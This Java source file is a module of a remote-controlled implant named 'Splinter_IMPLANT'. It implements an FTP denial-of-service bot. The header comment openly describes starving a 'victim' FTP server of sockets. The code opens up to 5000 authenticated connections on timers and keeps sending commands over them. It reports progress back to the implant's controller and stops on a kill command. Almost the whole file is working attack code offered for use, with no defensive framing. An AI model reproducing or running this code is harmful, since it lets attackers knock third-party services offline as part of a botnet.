/**
 * Introducing DOS_Bot for FTP
 * 
 * DOS'ing a system can be accomplished in many ways.
 * But first, let's define DOS'ing from the developer's point of view. 
 * Although DOS is denying availability of a service to entities, from my view, this definition is simply
 * an observed or measured affect of the DOS.  in actuality, I see DOS'ing as RESOURCE STARVATION. 
 * 
 * now, resource starvation can be accomplished in many ways: sending fragmented packets, SYN half-open packets, 
 * etc.  
 * 
 * This DOS_Bot will accomplish resource starvation by opening as many sockets to the specified 
 * FTP address.  
 * 
 * This director class has a timer interrupt. Upon each interrupt of the first timer, it checks if it should
 * establish a new FTP_Object instance that handles the request for login, credentials, and commands
 * ... eventually the server will be starved of available sockets that it can handle
 * and then new sockets will be rejected until resources are freed by the HTTP err... when the DOS stops!
 * 
 * 
 * 
 * @author Solomon Sonya
 */


package Implant.Payloads.DOS_Bot.FTP_DOS_Bot;

import java.awt.event.ActionListener;
import java.io.*;
import java.net.*;
import javax.net.ssl.*;
import javax.net.*;
import java.awt.event.*;
import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.util.*;

import javax.swing.Timer;

public class DOS_Bot_FTP_Director extends Thread implements Runnable, ActionListener
{
	public static final String myClassName = "DOS_Bot_FTP_Director";
	public static volatile boolean run_DOS_Bot = false;
	
	public volatile String victimURL = "";
	public volatile int victimControlPort = 21;
	public volatile int victimDataPort = 20;
	
	public volatile static int maxSockets = 5000;
	
	public volatile int millisecInterruptDelayInterval = 100;
	public volatile Timer tmrInterrupt_instantiate_FTP_object = null;
	public volatile Timer tmrInterrupt_FUZZ = null;//execute the command for the dos
	public volatile boolean handleInterrupt = false;
	
	public volatile int millisecInterruptDelayInterval_FUZZ = 1000;
	public volatile boolean handleInterrupt_FUZZ = false;
	public volatile boolean success = true;
	public volatile FTP_Object node = null;
	
	public Splinter_IMPLANT implant = null;
	
	
	//public volatile LinkedList<HttpURLConnection> queHTTP_Sockets = new LinkedList<HttpURLConnection>();
	public volatile String queueSize_prev = "";
	public volatile LinkedList<FTP_Object> queFTP_Sockets = new LinkedList<FTP_Object>();
	public volatile LinkedList<String> queFTP_FUZZ_Commands = new LinkedList<String>();//this will be the list of commands to execute each time the interrupt fires.  The director iterates through the list each time, removes the command, then directs the FTP_Object to execute it
	
	FTP_Object DOS_Bot_Object  = null;
		
	String userName = "anonymous";
	String password = "";
	
	public DOS_Bot_FTP_Director(String victimNet, int victimCtrlPrt, int victimDataPrt, String userNme, String pass, LinkedList<String> queCmdList, Splinter_IMPLANT parent)
	{
		try
		{
			implant = parent;
			victimURL = victimNet;
			
			victimControlPort = victimCtrlPrt;
			victimDataPort = victimDataPrt;
			
			userName = userNme;
			password = pass;
			
			queFTP_FUZZ_Commands = queCmdList;
			
			if(victimControlPort < 1 || victimControlPort > 65534)
			{
				Driver.sop("Victim FTP Control Port [" + victimControlPort + "] is out of range, defaulting to port 21");
				this.sendToController("Victim FTP Control Port [" + victimControlPort + "] is out of range, defaulting to port 21");
				victimControlPort = 21;
			}
			
			if(victimDataPort < 1 || victimDataPort > 65534)
			{
				Driver.sop("Victim FTP Data Port [" + victimDataPort + "] is out of range, defaulting to port 20");
				this.sendToController("Victim FTP Data Port [" + victimDataPort + "] is out of range, defaulting to port 20");
				victimControlPort = 20;
			}
			
			if(queFTP_FUZZ_Commands == null || queFTP_FUZZ_Commands.size() < 1)
			{
				Driver.sop("No commands were received upon successful FTP Authentication. Defaulting to \"dir\"");
				this.sendToController("No commands were received upon successful FTP Authentication. Defaulting to \"dir\"");
				queFTP_FUZZ_Commands = new LinkedList<String>();
				queFTP_FUZZ_Commands.addFirst("LIST");
			}
			
			/*if(victimURL != null && !victimURL.toLowerCase().startsWith("http://"))
			{
				victimURL = "http://" + victimURL;
			}*/
			
			this.start();
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", myClassName, e, "", false);
		}
	}
	
	public void run()
	{
		try
		{
			run_DOS_Bot = true;
			
			//reset timer
			try
			{
				FTP_Object.informedControllerOfDOS = false;
				FTP_Object.informedSOP_Of_DOS = false;
			}
			catch(Exception e){}
			
			//start timer thread. interrupt will be used to iterate through queue of established sockets
			//proceed in the following manner:
			//wake: check if queue is at max capacity, if not, instantiate new socket to victim
			//fall through to process all sockets in queue, for each socket, send get request, empty queue
			//repeat until end of queue, release semaphore, go back to sleep until next interrupt
			Driver.sop("Commencing Orbiter FTP_DOS_Bot now... Victim Net: " + victimURL + " : " + victimControlPort);
			this.sendToController("Commencing Orbiter FTP_DOS_Bot now... Victim Net: " + victimURL + " : " + victimControlPort);
			
			handleInterrupt = false;
			this.tmrInterrupt_instantiate_FTP_object = new Timer(this.millisecInterruptDelayInterval, this);
//Driver.jop("timer stop1");
tmrInterrupt_instantiate_FTP_object.start();
			handleInterrupt = true;
			
			//start the fuzzer interrupt. so thus, we have 2 interrupt timers, one to instantiate new sockets, and the other to check already established sockets, and make random requests
			handleInterrupt_FUZZ = false;
			this.tmrInterrupt_FUZZ = new Timer(this.millisecInterruptDelayInterval_FUZZ , this);
//Driver.jop("timer stop2");
tmrInterrupt_FUZZ.start();
			handleInterrupt_FUZZ = true;
			
			
//Driver.sop("FTP OVERRIDE!!!");
//processInterrupt();
			
		}
		catch(Exception e)
		{
			Driver.eop("run", myClassName, e, "", false);
		}
	}
	
	public boolean HALT_DOS()
	{
		try
		{
			Driver.sop("FTP_DOS_Bot kill command received! terminating DOS orbiters...");
			sendToController("FTP_DOS_Bot kill command received! terminating DOS orbiters...");
			
			try
			{
				this.tmrInterrupt_instantiate_FTP_object.stop();
				this.tmrInterrupt_FUZZ.stop();
				//this.queFTP_Sockets.clear();
			}
			catch(Exception ee)
			{
				implant.sendToController("Timers FTP Check by Director", false, true);
			}
			
			//now need to close the connections
			try
			{
				for(int i = 0; i < this.queFTP_Sockets.size(); i++)
				{
					try
					{
						try {	queFTP_Sockets.get(i).brIn.close();	}	catch(Exception e){}
						try {	queFTP_Sockets.get(i).pwOut.close();	}	catch(Exception e){}
						try {	queFTP_Sockets.get(i).mySocket.close();	}	catch(Exception e){}
					}
					catch(Exception eee)
					{
						continue;
					}
				}
			}
			catch(Exception ee)
			{
			
			}
			
			this.run_DOS_Bot = false;
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("HALT_DOS", myClassName, e, "", false);
		}
		
		return false;
		
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrInterrupt_instantiate_FTP_object)
			{				
				
				if(!run_DOS_Bot)
				{
					Driver.sop("FTP_DOS_Bot kill command received! halting DOS orbiters...");
					sendToController("FTP_DOS_Bot kill command received! halting DOS orbiters...");
					
					this.HALT_DOS();
					
					try
					{
						this.tmrInterrupt_instantiate_FTP_object.stop();
						this.tmrInterrupt_FUZZ.stop();
						//this.queFTP_Sockets.clear();
					}catch(Exception e){}
				}
				
				else if(handleInterrupt)
				{
					processInterrupt();
					//Driver.sop("punt!");
				}
			}
			
			else if(ae.getSource() == this.tmrInterrupt_FUZZ)
			{
				if(handleInterrupt_FUZZ)
				{
					processInterrupt_FUZZ();
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("ae", myClassName, e, "", false);
		}
	}
	
	public boolean processInterrupt()
	{
		try
		{						
			handleInterrupt = false;
			
			//ensure queue is ok
			if(queFTP_Sockets == null)
			{
				queFTP_Sockets = new LinkedList<FTP_Object>();
			}
			
			//check if we have instantiated the max number of http sockets
			if(queFTP_Sockets != null && queFTP_Sockets.size() < this.maxSockets)
			{
				//instantiate new HTTP Socket
				instantiate_FTP_Socket_Authenticate();
				
				if(this.queFTP_Sockets.size() % 100 == 0)
				{
					if(queueSize_prev != null && !queueSize_prev.trim().equals(""+this.queFTP_Sockets.size()))
					{
						//only update if the sizes are different
						Driver.sop("FTP Orbiter DOS Progress Check --> queue connection size: " + queFTP_Sockets.size());
						
						if(implant != null)
						{
							implant.sendToController("FTP Orbiter DOS Progress Check --> queue connection size: " + queFTP_Sockets.size(), false, false);
						}
						
						
						
						queueSize_prev = "" + this.queFTP_Sockets.size();
					}
				}
			}
						
			
			handleInterrupt = true;
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processInterrupt", myClassName, e, "", false);
		}
		
		handleInterrupt = true;
		return false;
	}
	
	public boolean instantiate_FTP_Socket_Authenticate()
	{
		try
		{			
			DOS_Bot_Object = new FTP_Object(this.victimURL, victimControlPort, this.victimDataPort, userName, password, this);
			//this.queFTP_Sockets.addLast(DOS_Bot_Object);			
			//delay being added to the queue until we have authenticated with the FTP server
			
			//Driver.sop("size: " + queHTTP_Sockets.size());
			//Driver.jop("Override 3");
			processInterrupt_FUZZ();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("instantiate_HTTP_Socket_GET", myClassName, e, "", false);
		}
		
		return false;
	}
	
	//this mtd simply interates through established sockets to fuzz the victim server
	public boolean processInterrupt_FUZZ()
	{
		try
		{
			handleInterrupt_FUZZ = false;
			
			for(int i = 0; queFTP_Sockets != null && i < this.queFTP_Sockets.size(); i++)
			{
				//queHTTP_Sockets.get(i).sendFuzz(""+Math.random() * 300 + ".jpg");//this will kill the connection for invalid requests, instead, send valid get requests over and over and over again
				success = queFTP_Sockets.get(i).sendCommand(this.queFTP_FUZZ_Commands.get(0));
				
				//Driver.jop("halting temporarily");
				
				if(!success)
				{
					//Driver.jop("AUTHENTICATE FAIL");
					
					//socket encountered an error, remove it!
					//node = queHTTP_Sockets.get(i);
					Driver.sop("FTP Authentication FAIL!!!");
					node = queFTP_Sockets.remove(i);
					
					//remove the node
					if(node != null)
					{
						try
						{
							node.pwOut.close();
							node.brIn.close();
						}catch(Exception e){}
						
						try
						{
							node.mySocket.close();
						}catch(Exception e){}
						
						node = null;
					}
				}
			}
			
			handleInterrupt_FUZZ = true;
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processInterrupt_FUZZ", myClassName, e, "", false);
		}
		
		handleInterrupt_FUZZ = true;
		
		return false;
	}
	
	
	
	public boolean sendToController(String strToSend)
	{
		try
		{
			if(implant != null)
			{
				implant.sendToController(strToSend, false, false);				
			}						
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendToController", myClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

}
